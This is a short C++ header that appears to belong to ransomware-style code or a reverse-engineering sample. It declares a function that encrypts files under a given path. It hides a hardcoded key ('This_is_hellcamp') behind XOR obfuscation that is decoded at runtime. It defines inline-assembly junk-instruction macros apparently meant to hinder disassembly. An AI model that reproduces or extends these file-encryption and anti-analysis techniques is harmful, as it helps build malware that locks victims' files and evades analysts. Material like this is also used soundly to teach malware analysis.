#pragma once
#include <iostream>
#include <string>

using namespace std;

#define NULLPAD_Com1 __asm{push eax}
#define NULLPAD_Com2 __asm{mov eax, esp}
#define NULLPAD_Com3 __asm{add BYTE PTR [eax], al}
#define NULLPAD_Com4 __asm{pop eax}
#define NULLPAD_10 NULLPAD_Com1; NULLPAD_Com2; NULLPAD_Com3; NULLPAD_Com3; NULLPAD_Com3; NULLPAD_Com3; NULLPAD_Com4;

void encrypt_files(char *path);

static const char* getkey()
{
	static char data[] = {
		'T' ^ (0x27 - 0), 'h' ^ (0x27 - 1),'i' ^ (0x27 - 2),'s' ^ (0x27 - 3),
		'_' ^ (0x27 - 4),'i' ^ (0x27 - 5),'s' ^ (0x27 - 6),'_' ^ (0x27 - 7),
		'h' ^ (0x27 - 8),'e' ^ (0x27 - 9),'l' ^ (0x27 - 10),'l' ^ (0x27 - 11),'c' ^ (0x27 - 12),
		'a' ^ (0x27 - 13),'m' ^ (0x27 - 14),'p' ^ (0x27 - 15),'\0' };
	static bool isEncrypted = true;

	if (isEncrypted) {
		for (int i = 0; i < (sizeof(data) / sizeof(data[0])) - 1; i++)
			data[i] ^= (0x27 - i);
		isEncrypted = false;
	}

	return data;
}